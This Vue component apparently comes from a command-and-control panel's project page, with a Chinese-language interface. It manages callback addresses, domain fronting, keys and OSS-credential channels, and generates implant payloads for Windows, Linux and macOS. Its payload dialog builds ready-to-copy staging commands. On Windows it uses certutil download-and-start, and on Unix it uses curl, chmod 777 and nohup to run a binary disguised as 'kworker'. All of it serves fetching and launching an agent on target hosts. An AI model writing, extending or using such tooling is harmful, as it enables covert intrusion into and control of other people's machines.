<script setup>
import { ref, reactive, computed, onMounted, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Plus, Refresh, Delete, Edit, Download, Search } from '@element-plus/icons-vue'
import { projectList, projectDelete, projectUpdate } from '@/api/project'
import { generatePayload } from '@/api/agent'
import { listenList } from '@/api/listen'
import { settingList } from '@/api/setting'
import { useAuthStore } from '@/stores/auth'
import { formatTime } from '@/utils/format'
import { copyToClipboard } from '@/utils/clipboard'
import { licenseAllowed } from '@/utils/license'

const authStore = useAuthStore()
const loading = ref(false)
const list = ref([])
const keyword = ref('')

const filteredList = computed(() => {
  const kw = keyword.value.trim().toLowerCase()
  if (!kw) return list.value
  return list.value.filter(
    (p) =>
      (p.name || '').toLowerCase().includes(kw) ||
      (p.callback1 || '').toLowerCase().includes(kw) ||
      (p.route || '').toLowerCase().includes(kw) ||
      (p.enckey || '').toLowerCase().includes(kw),
  )
})

async function loadData() {
  loading.value = true
  try {
    const res = await projectList({})
    const data = (res && res.result) || {}
    list.value = data.items || []
  } catch {

  } finally {
    loading.value = false
  }
}

const dialogVisible = ref(false)
const submitting = ref(false)
const isEdit = ref(false)
const formRef = ref(null)
const formRules = {
  name: [{ required: true, message: '请输入项目名称', trigger: 'blur' }],
  listen: [{ required: true, message: '请选择 NPC2 地址', trigger: 'change' }],
}
const form = reactive({
  id: null,
  route: '',
  name: '',
  enckey: '',
  listen: '',
  transport: 'http',
  domain: '',
  proxy: '',
  callback1: '',
  callback2: '',
  config: '',
  isrun: true,
  note: '',
  // transport=oss 时的结构化字段 (提交时合成 callback1 桶形式 + config 凭据 JSON)
  ossEndpoint: '',
  ossBucket: '',
  ossAk: '',
  ossSk: '',
})

// 检测项目是否为 oss 形式 (桶形式回调 + config 凭据, 与后端 is_s3_project 同规则)
// 连续斜杠容忍 (host//bkt), 与后端 parse_bucket_cb 折叠规则一致
function parseOssProject(row) {
  const cb = String(row.callback1 || '').trim()
  const m = cb.match(/^(https?):\/\/([^/]+)\/+([^/?#]+)/)
  if (!m) return null
  let ak = ''
  let sk = ''
  try {
    const c = JSON.parse(row.config || '')
    if (c && typeof c === 'object') {
      ak = typeof c.ak === 'string' ? c.ak : ''
      sk = typeof c.sk === 'string' ? c.sk : ''
    }
  } catch {
    // 非 JSON 视为非 oss 项目
  }
  if (!ak || !sk) return null
  return { endpoint: `${m[1]}://${m[2]}`, bucket: m[3], ak, sk }
}

// endpoint 归一化: 补全缺失的 scheme (默认 https, 本地 MinIO 可显式写 http://)
function normalizeEndpoint(raw) {
  const s = String(raw || '').trim().replace(/\/+$/, '')
  if (!s) return ''
  return /^https?:\/\//i.test(s) ? s : `https://${s}`
}

const listenOptions = ref([])
async function loadListenOptions() {
  try {
    const res = await listenList({})
    const items = ((res && res.result) || {}).items || []
    listenOptions.value = items.map((l) => ({
      label: `${l.transport}@${l.onlineaddr}`,
      value: l.id,
    }))
  } catch {

  }
}

function openAdd() {
  loadListenOptions()
  isEdit.value = false
  Object.assign(form, {
    id: null,
    route: '',
    name: '',
    enckey: '',
    listen: '',
    transport: 'http',
    domain: '',
    proxy: '',
    callback1: '',
    callback2: '',
    config: '',
    isrun: true,
    note: '',
    ossEndpoint: '',
    ossBucket: '',
    ossAk: '',
    ossSk: '',
  })
  dialogVisible.value = true
}
function openEdit(row) {
  loadListenOptions()
  isEdit.value = true
  const oss = parseOssProject(row)
  Object.assign(form, {
    id: row.id,
    route: row.route || '',
    name: row.name || '',
    enckey: row.enckey || '',
    listen: row.listen || '',
    transport: oss ? 'oss' : 'http',
    domain: row.domain || '',
    proxy: row.proxy || '',
    callback1: row.callback1 || '',
    callback2: row.callback2 || '',
    config: oss ? '' : row.config || '',
    isrun: !!row.isrun,
    note: row.note || '',
    ossEndpoint: oss ? oss.endpoint : '',
    ossBucket: oss ? oss.bucket : '',
    ossAk: oss ? oss.ak : '',
    ossSk: oss ? oss.sk : '',
  })
  dialogVisible.value = true
}

async function submit() {
  if (!formRef.value) return
  try {
    await formRef.value.validate()
  } catch {
    return
  }
  // oss 模式: 结构化字段 → 桶形式回调 + 凭据 JSON (与后端 create_project 同格式)
  if (form.transport === 'oss') {
    if (!form.ossEndpoint.trim() || !form.ossBucket.trim() || !form.ossAk.trim() || !form.ossSk.trim()) {
      ElMessage.warning('OSS 模式需填写端点 / 桶名 / AK / SK')
      return
    }
  }
  submitting.value = true
  try {
    // 备用地址池: 前端单行逗号输入, 后端按行拆分 —— 提交前归一化为换行分隔
    const callback2 = form.callback2
      .split(/[,，\n]/)
      .map(s => s.trim())
      .filter(Boolean)
      .join('\n')
    const payload = {
      id: form.id,
      route: form.route,
      name: form.name,
      enckey: form.enckey,
      listen: form.listen,
      domain: form.domain,
      proxy: form.proxy,
      callback2,
      isrun: form.isrun,
      note: form.note,
    }
    if (form.transport === 'oss') {
      // 桶名去首尾斜杠, 防拼出 host//bkt 双斜杠形式
      const bucket = form.ossBucket.trim().replace(/^\/+/, '').replace(/\/+$/, '')
      payload.callback1 = `${normalizeEndpoint(form.ossEndpoint)}/${bucket}`
      payload.config = JSON.stringify({ ak: form.ossAk.trim(), sk: form.ossSk.trim() })
    } else {
      payload.callback1 = form.callback1
      payload.config = form.config
    }
    await projectUpdate(payload)
    ElMessage.success('已保存')
    dialogVisible.value = false
    loadData()
  } catch {

  } finally {
    submitting.value = false
  }
}

async function handleDelete(row) {
  try {
    await ElMessageBox.confirm(
      `确定删除项目 ${row.name} 吗？该操作不可恢复。`,
      '删除确认',
      { type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消' },
    )
    await projectDelete(row.id)
    ElMessage.success('已删除')
    loadData()
  } catch {

  }
}

// 设为目标: 纯前端保存项目 id, 不发请求, 同一账号多处登录互不影响
function handleSetTarget(row) {
  if (authStore.target === row.id) return
  authStore.setTarget(row.id)
  ElMessage.success(`已切换到项目: ${row.name}`)
}

async function toggleRun(row) {
  try {
    await projectUpdate({ id: row.id, isrun: !row.isrun })
    ElMessage.success(row.isrun ? '已停用' : '已启用')
    loadData()
  } catch {

  }
}

// ============================================================================
// 生成NPC (可选 NPC1 / NPC2 独立形态, 经项目路由下发)
// ============================================================================
const npcVisible = ref(false)
const npcLoading = ref(false)
const npcForm = reactive({ project: '', ptype: '1', platform: '1', arch: '1' })
const npcResult = reactive({ url: '', cmd: '' })

const archOptions = [
  { label: 'x86_64', value: '1' },
  { label: 'x86', value: '2' },
  { label: 'aarch64', value: '3' },
  { label: 'mips64', value: '5' },
  { label: 'loongarch64', value: '7' },
]
const platformOptions = [
  { label: 'Windows', value: '1' },
  { label: 'Linux', value: '2' },
  { label: 'macOS', value: '3' },
]
// 载荷类型: strmod 百位编码, 1=npc1, 5=npc2 独立 exe/elf (千位固定 1, 需落在 1000..2000)
const ptypeOptions = [
  { label: 'NPC1', value: '1' },
  { label: 'NPC2', value: '5' },
]

// 项目选项: 项目名称|回连地址/项目路由
const projectOptions = computed(() =>
  list.value.map((p) => ({
    label: `${p.name}|${p.callback1}/${p.route}`,
    value: p.id,
  })),
)

watch(
  () => [npcForm.project, npcForm.ptype, npcForm.platform, npcForm.arch],
  () => {
    Object.assign(npcResult, { url: '', cmd: '' })
  },
)

function openNpc() {
  if (!list.value.length) {
    ElMessage.warning('请先创建项目')
    return
  }
  // 默认选中当前目标项目
  Object.assign(npcForm, {
    project: authStore.target || '',
    ptype: '1',
    platform: '1',
    arch: '1',
  })
  Object.assign(npcResult, { url: '', cmd: '' })
  npcVisible.value = true
}

// 载荷下载统一走 npc1 HTTP 门面 (oss 项目也不例外): http://{vps_ip}:{npc.listen端口}
let facadeBaseCache = null
async function httpFacadeBase() {
  if (facadeBaseCache !== null) return facadeBaseCache
  try {
    const res = await settingList({ page: 1, size: 200 })
    const items = ((res && res.result) || {}).items || []
    const get = (k) => {
      const it = items.find((i) => i.key === k)
      return it ? String(it.value || '').trim() : ''
    }
    const vps = get('nps.vps_ip') || '127.0.0.1'
    const listen = get('npc.listen') || '0.0.0.0:31000'
    const port = listen.split(':').pop() || '31000'
    facadeBaseCache = `http://${vps}:${port}`
  } catch {
    facadeBaseCache = ''
  }
  return facadeBaseCache
}

async function doGenerateNpc() {
  // npc2 独立形态 (ptype=5) 需要有效授权, npc1 基础功能不受限
  if (npcForm.ptype === '5' && !licenseAllowed()) return
  const proj = list.value.find((p) => p.id === npcForm.project)
  if (!proj) {
    ElMessage.warning('请选择项目')
    return
  }
  npcLoading.value = true
  try {
    // strmod: 千位1 + 百位(载荷: 1=npc1, 5=npc2 独立形态) + 十位(架构) + 个位(系统)
    const head = npcForm.ptype === '5' ? '15' : '11'
    const mod = `${head}${npcForm.arch}${npcForm.platform}`
    const res = await generatePayload({ id: proj.id, data: mod })
    const result = (res && res.result) || ''
    const path = typeof result === 'object' ? result.path || result.url || result.filename || '' : String(result)
    const cleanPath = String(path).replace(/^\//, '')
    // oss 项目回调地址是对象存储端点, 不能用于载荷下载; 统一改走 HTTP 门面基址
    const base = parseOssProject(proj)
      ? await httpFacadeBase()
      : String(proj.callback1 || '').trim().replace(/\/+$/, '')
    if (base && proj.route) {
      npcResult.url = `${base}/${proj.route}/${cleanPath}`
      if (npcForm.platform === '1') {
        const fname = cleanPath.split('/').pop() || 'work'
        npcResult.cmd = `certutil.exe -urlcache -split -f ${npcResult.url} ${fname} && start ${fname}`
      } else {
        npcResult.cmd = `curl ${npcResult.url} -o kworker && chmod 777 ./kworker && nohup ./kworker &`
      }
    } else {
      npcResult.url = cleanPath
      npcResult.cmd = ''
    }
    ElMessage.success(npcForm.ptype === '5' ? 'NPC2 生成成功，链接4小时内有效' : 'NPC1 生成成功，链接4小时内有效')
  } catch {

  } finally {
    npcLoading.value = false
  }
}

function copyText(text) {
  copyToClipboard(text)
}

onMounted(loadData)
</script>

<template>
  <div class="page-container">
    <el-card shadow="never">
      <div class="toolbar">
        <el-input
          v-model="keyword"
          placeholder="搜索 名称 / 回调地址 / 路由 / 密钥"
          :prefix-icon="Search"
          clearable
          size="small"
          style="width: 280px"
        />
        <div class="flex-grow"></div>
        <el-button type="primary" size="small" :icon="Download" @click="openNpc">生成NPC</el-button>
        <el-button type="primary" size="small" :icon="Plus" @click="openAdd">新建项目</el-button>
        <el-button size="small" :icon="Refresh" :loading="loading" @click="loadData">刷新</el-button>
      </div>

      <el-table v-loading="loading" :data="filteredList" border stripe size="small" empty-text="暂无项目">
        <el-table-column label="项目名称" prop="name" min-width="130" show-overflow-tooltip />
        <el-table-column label="回调地址" prop="callback1" min-width="180" show-overflow-tooltip />
        <el-table-column label="路由" prop="route" min-width="120" show-overflow-tooltip />
        <el-table-column label="密钥" prop="enckey" min-width="120" show-overflow-tooltip />
        <el-table-column label="目标" width="70" align="center">
          <template #default="{ row }">
            <el-radio
              class="target-radio"
              :model-value="authStore.target"
              :value="row.id"
              @change="handleSetTarget(row)"
            >{{ '' }}</el-radio>
          </template>
        </el-table-column>
        <el-table-column label="状态" width="100" align="center">
          <template #default="{ row }">
            <el-switch :model-value="row.isrun" @change="toggleRun(row)" />
          </template>
        </el-table-column>
        <el-table-column label="更新时间" width="170">
          <template #default="{ row }">{{ formatTime(row.updateat) }}</template>
        </el-table-column>
        <el-table-column label="操作" width="190" fixed="right" class-name="op-col">
          <template #default="{ row }">
            <el-button size="small" :icon="Edit" @click="openEdit(row)">编辑</el-button>
            <el-button size="small" type="danger" :icon="Delete" @click="handleDelete(row)">
              删除
            </el-button>
          </template>
        </el-table-column>
      </el-table>
    </el-card>

    <el-dialog v-model="dialogVisible" :title="isEdit ? '编辑项目' : '新建项目'" width="600px">
      <el-form ref="formRef" :model="form" :rules="formRules" label-width="90px" autocomplete="off">
        <el-form-item label="协议" required>
          <el-radio-group v-model="form.transport">
            <el-radio-button value="http">HTTP(s)</el-radio-button>
            <el-radio-button value="oss">OSS</el-radio-button>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="名称" prop="name">
          <el-input v-model="form.name" placeholder="请输入项目名称" />
        </el-form-item>
        <template v-if="form.transport === 'oss'">
          <el-form-item label="端点" required>
            <el-input v-model="form.ossEndpoint" placeholder="https://oss-cn-hangzhou.aliyuncs.com (本地 MinIO 可写 http://127.0.0.1:9000)" />
          </el-form-item>
          <el-form-item label="桶名" required>
            <el-input v-model="form.ossBucket" placeholder="如: my-bucket" />
          </el-form-item>
          <el-form-item label="AK" required>
            <!-- autocomplete: 阻止浏览器密码管理器把站内登录凭据自动填进 AK -->
            <el-input v-model="form.ossAk" placeholder="AccessKeyId" autocomplete="off" name="oss-ak" />
          </el-form-item>
          <el-form-item label="SK" required>
            <!-- new-password 是唯一能可靠阻止 Chrome/Edge 对密码框自动填充站内凭据的取值 -->
            <el-input v-model="form.ossSk" placeholder="AccessKeySecret" show-password autocomplete="new-password" name="oss-sk" />
          </el-form-item>
        </template>
        <template v-else>
          <el-form-item label="回调地址" :required="form.transport === 'http'">
            <el-input v-model="form.callback1" placeholder="如: http://1.2.3.4:31000" />
          </el-form-item>
        </template>
        <el-form-item label="NPC2地址" prop="listen">
          <el-select v-model="form.listen" placeholder="选择监听器" filterable clearable style="width: 100%">
            <el-option v-for="o in listenOptions" :key="o.value" :label="o.label" :value="o.value" />
          </el-select>
        </el-form-item>
        <el-form-item label="备用地址池">
          <el-input
            v-model="form.callback2"
            placeholder="备用回连地址, 多个用逗号分隔, 如: http://5.6.7.8:31000"
          />
        </el-form-item>
        <el-form-item v-if="form.transport !== 'oss'" label="上线域名"><el-input v-model="form.domain" placeholder="域前置" /></el-form-item>
        <el-form-item label="代理地址"><el-input v-model="form.proxy" placeholder="(socks|http|https)://user:pass@127.0.0.1:8080" /></el-form-item>
        <el-form-item label="路由">
          <el-input v-model="form.route" placeholder="留空自动生成" />
        </el-form-item>
        <el-form-item label="密钥">
          <el-input v-model="form.enckey" placeholder="留空自动生成" />
        </el-form-item>
        <el-form-item v-if="form.transport !== 'oss'" label="配置"><el-input v-model="form.config" type="textarea" :autosize="{ minRows: 2 }" /></el-form-item>
        <el-form-item label="备注"><el-input v-model="form.note" /></el-form-item>
        <el-form-item label="启用"><el-switch v-model="form.isrun" /></el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="dialogVisible = false">取消</el-button>
        <el-button type="primary" :loading="submitting" @click="submit">保存</el-button>
      </template>
    </el-dialog>

    <el-dialog v-model="npcVisible" title="生成NPC" width="640px">
      <el-form :model="npcForm" label-width="100px">
        <el-form-item label="选择项目">
          <el-select v-model="npcForm.project" filterable placeholder="项目名称|回连地址/项目路由" style="width: 100%">
            <el-option v-for="o in projectOptions" :key="o.value" :label="o.label" :value="o.value" />
          </el-select>
        </el-form-item>
        <el-form-item label="载荷类型">
          <el-radio-group v-model="npcForm.ptype">
            <el-radio-button v-for="o in ptypeOptions" :key="o.value" :value="o.value">
              {{ o.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="CPU架构">
          <el-radio-group v-model="npcForm.arch">
            <el-radio-button v-for="o in archOptions" :key="o.value" :value="o.value">
              {{ o.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
        <el-form-item label="目标系统">
          <el-radio-group v-model="npcForm.platform">
            <el-radio-button v-for="o in platformOptions" :key="o.value" :value="o.value">
              {{ o.label }}
            </el-radio-button>
          </el-radio-group>
        </el-form-item>
      </el-form>

      <div class="payload-result">
        <div class="payload-label">NPC下载地址</div>
        <el-input :model-value="npcResult.url" readonly placeholder="点击生成按钮获取">
          <template #append>
            <el-button @click="copyText(npcResult.url)" :disabled="!npcResult.url">复制</el-button>
          </template>
        </el-input>
      </div>
      <div class="payload-result">
        <div class="payload-label">上线命令</div>
        <el-input :model-value="npcResult.cmd" readonly placeholder="点击生成按钮获取">
          <template #append>
            <el-button @click="copyText(npcResult.cmd)" :disabled="!npcResult.cmd">复制</el-button>
          </template>
        </el-input>
      </div>

      <template #footer>
        <div class="payload-footer">
          <el-button type="primary" :loading="npcLoading" @click="doGenerateNpc">生成</el-button>
          <el-button @click="npcVisible = false">关闭</el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<style scoped>
.target-radio :deep(.el-radio__label) {
  display: none;
}
.payload-result {
  margin-bottom: 12px;
}
.payload-label {
  font-size: 13px;
  color: var(--tk-accent);
  margin-bottom: 6px;
  font-family: 'Consolas', monospace;
}
.payload-footer {
  display: flex;
  justify-content: space-between;
  width: 100%;
}
</style>
